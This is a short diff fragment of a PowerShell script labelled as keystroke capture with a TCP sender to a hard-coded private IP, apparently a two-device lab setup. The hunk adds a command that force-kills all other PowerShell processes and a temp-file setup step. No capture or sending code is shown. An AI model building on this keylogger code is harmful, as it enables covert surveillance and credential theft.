@@ -1,6 +1,9 @@
 # Device B - Keystroke Capture + TCP Sender
 $deviceAIP = "172.17.2.85"
 
+# Kill any previous instances of this script to avoid slowdown
+Get-Process powershell | Where-Object { $_.Id -ne $PID } | Stop-Process -Force
+
 # Setup temp file
 $path = "$env:temp\testing.txt"
 if ((Test-Path $path) -eq $false) { New-Item $path }
